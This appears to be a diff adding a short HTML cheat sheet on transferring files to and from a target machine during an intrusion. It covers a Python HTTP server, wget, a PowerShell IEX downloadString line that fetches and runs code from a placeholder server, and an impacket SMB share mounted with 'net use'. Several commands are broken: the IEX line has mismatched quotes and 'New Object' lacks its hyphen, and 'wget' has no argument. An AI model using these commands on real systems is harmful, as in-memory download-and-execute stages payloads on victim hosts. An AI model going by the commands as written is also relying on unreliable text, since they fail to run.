@@ -1,0 +1,32 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>transfer file</title>
+</head><body># Server<br/>
+<br/>
+python3 -m http.server 80<br/>
+python2 -m SimpleHTTPServer 80<br/>
+<br/>
+<br/>
+# Client<br/>
+## Linux<br/>
+wget <br/>
+<br/>
+## Windows<br/>
+IEX(New Object Net.WebClient).downloadString('http://&lt;server&gt;/&lt;file&gt;")<br/>
+<br/>
+<br/>
+<b>Using SMB</b><br/>
+<br/>
+# receiver<br/>
+mkdir smb<br/>
+cd smb<br/>
+impacket-smbserver share `pwd`<br/>
+<br/>
+<br/>
+# sender<br/>
+<br/>
+net use z: \\&lt;receiver ip&gt;\share<br/>
+<br/>
+</body></html>
